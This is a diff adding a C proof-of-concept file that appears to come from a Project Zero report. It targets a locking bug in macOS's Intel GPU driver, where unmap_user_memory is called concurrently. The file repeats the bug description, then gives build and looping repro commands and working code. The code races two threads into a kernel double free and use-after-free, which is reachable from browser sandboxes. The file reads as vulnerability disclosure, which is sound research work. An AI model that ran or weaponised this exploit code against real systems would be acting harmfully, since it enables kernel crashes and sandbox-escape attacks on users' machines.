@@ -1,0 +1,277 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=708
+
+The external methods IGAccelGLContext::unmap_user_memory and IGAccelCLContext::unmap_user_memory take
+an 8 byte struct input which is a user-space pointer previously passed to the equivilent map_user_memory
+method.
+
+The Context objects have inline IGHashTable members which store a mapping between those user pointers
+and the IGAccelMemoryMap object pointers to which they refer in the kernel. The unmap_user_memory method
+calls in order:
+  ::contains
+  ::get
+  ::remove
+on the hashmap *before* taking the context's IOLock. This means we can race two threads and by passing them both a valid
+mapped user pointer they will both look up the same value in the hash map and return it.
+
+The first exploitable bug is that none of these methods are thread safe; it's quite possible for two threads to be in the
+::remove method at the same time and call IOFree on the hash bucket list entry resulting in a double free.
+
+The second bug is that after the call to ::remove although a lock is taken on the Context by this point it's too late; both threads have a pointer to
+the same IGAccelMemoryMap which only has one reference. The first thread will call ::release which will free the object, then
+the thread will drop the lock, the second thread will acquire it and then use the free'd object before calling ::release again.
+
+This user client code is reachable from many sandboxes including the safari renderer and the chrome gpu process.
+*/
+
+//ianbeer
+
+// build: clang -o ig_gl_unmap_racer ig_gl_unmap_racer.c -framework IOKit -lpthread
+// repro: while true; do ./ig_gl_unmap_racer; done
+//        (try something like this in your boot-args for a nice panic log: gzalloc_min=0x80 gzalloc_max=0x120 -zc -zp)
+
+/*
+Use after free and double delete due to incorrect locking in Intel GPU Driver
+
+The external methods IGAccelGLContext::unmap_user_memory and IGAccelCLContext::unmap_user_memory take
+an 8 byte struct input which is a user-space pointer previously passed to the equivilent map_user_memory
+method.
+
+The Context objects have inline IGHashTable members which store a mapping between those user pointers
+and the IGAccelMemoryMap object pointers to which they refer in the kernel. The unmap_user_memory method
+calls in order:
+  ::contains
+  ::get
+  ::remove
+on the hashmap *before* taking the context's IOLock. This means we can race two threads and by passing them both a valid
+mapped user pointer they will both look up the same value in the hash map and return it.
+
+The first exploitable bug is that none of these methods are thread safe; it's quite possible for two threads to be in the
+::remove method at the same time and call IOFree on the hash bucket list entry resulting in a double free.
+
+The second bug is that after the call to ::remove although a lock is taken on the Context by this point it's too late; both threads have a pointer to
+the same IGAccelMemoryMap which only has one reference. The first thread will call ::release which will free the object, then
+the thread will drop the lock, the second thread will acquire it and then use the free'd object before calling ::release again.
+
+This user client code is reachable from many sandboxes including the safari renderer and the chrome gpu process.
+*/
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <libkern/OSAtomic.h>
+
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+
+#include <IOKit/IOKitLib.h>
+
+
+struct mem_desc {
+  uint64_t ptr;
+  uint64_t size;
+};
+
+uint64_t map_user_memory(mach_port_t conn) {
+  kern_return_t err;
+  void* mem = malloc(0x20000);
+  // make sure that the address we pass is page-aligned:
+  mem = (void*) ((((uint64_t)mem)+0x1000)&~0xfff);
+  printf("trying to map user pointer: %p\n", mem);
+  
+  uint64_t inputScalar[16] = {0};  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096] = {0};
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16] = {0};
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096] = {0};
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0x10;
+
+  outputScalarCnt = 4096;
+  outputStructCnt = 16;
+
+  struct mem_desc* md = (struct mem_desc*)inputStruct;
+  md->ptr = (uint64_t)mem;
+  md->size = 0x1000;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x200, // IGAccelGLContext::map_user_memory
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+   //return 0;
+  } else{
+    printf("worked? outputScalarCnt = %d\n", outputScalarCnt);
+  }
+    
+  printf("outputScalarCnt = %d\n", outputScalarCnt);
+
+  md = (struct mem_desc*)outputStruct;
+  printf("0x%llx :: 0x%llx\n", md->ptr, md->size);
+
+  return (uint64_t)mem;
+}
+
+uint64_t unmap_user_memory(mach_port_t conn, uint64_t handle) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0x8;
+
+  outputScalarCnt = 4096;
+  outputStructCnt = 16;
+
+  *((uint64_t*)inputStruct) = handle;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x201, // IGAccelGLContext::unmap_user_memory
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+  } else{
+    printf("worked?\n");
+  }
+  
+  return 0;
+}
+
+mach_port_t get_user_client(char* name, int type) {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching(name);
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+  // should be intel integrated graphics (only tested on MBA)  
+
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), type, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+  return conn;
+}
+
+mach_port_t gl_context = MACH_PORT_NULL;
+uint64_t handle = 0;
+
+
+OSSpinLock lock = OS_SPINLOCK_INIT;
+
+void go(void* arg){
+  int got_it = 0;
+  while (!got_it) {
+    got_it = OSSpinLockTry(&lock);
+  }
+
+  //usleep(1);
+
+  unmap_user_memory(gl_context, handle);
+  printf("called unmap from thread\n");
+}
+
+
+
+
+
+int main(int argc, char** argv){
+  // get an IGAccelGLContext
+  gl_context = get_user_client("IOAccelerator", 1);
+
+  // get a IGAccelSharedUserClient
+  mach_port_t shared = get_user_client("IOAccelerator", 6);
+
+  // connect the gl_context to the shared UC so we can actually use it:
+  kern_return_t err = IOConnectAddClient(gl_context, shared);
+  if (err != KERN_SUCCESS){
+   printf("IOConnectAddClient error: %x\n", err);
+   return 0;
+  }
+
+  printf("added client to the shared UC\n");
+
+  handle = map_user_memory(gl_context);
+
+  OSSpinLockLock(&lock);
+
+  pthread_t t;
+  pthread_create(&t, NULL, (void*) go, NULL);
+
+  usleep(100000);
+
+  OSSpinLockUnlock(&lock);
+
+  unmap_user_memory(gl_context, handle);
+  printf("called unmap from main process thread\n");
+  pthread_join(t, NULL);
+
+
+  return 0;
+
+
+}
